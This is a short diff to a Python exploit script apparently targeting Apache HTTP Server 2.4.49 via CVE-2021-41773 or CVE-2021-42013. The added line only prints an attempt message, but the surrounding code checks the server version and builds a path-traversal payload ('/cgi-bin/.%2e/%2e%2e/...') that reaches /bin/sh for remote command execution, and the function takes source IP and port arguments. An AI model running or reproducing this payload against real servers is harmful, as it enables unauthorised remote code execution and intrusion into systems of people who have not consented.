@@ -6,6 +6,7 @@ import os
 def exploit(ip_dest, port_dest, ip_src, port_src):
     try:
         host = 'http://{0}:{1}'.format(ip_dest, port_dest)
+        print('[+] Attempting to gain initial access with CVE-2021-41773 or CVE-2021-42013 on {}'.format(host))
         r = requests.get(host)
         if '49' in r.headers['Server']:
             payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
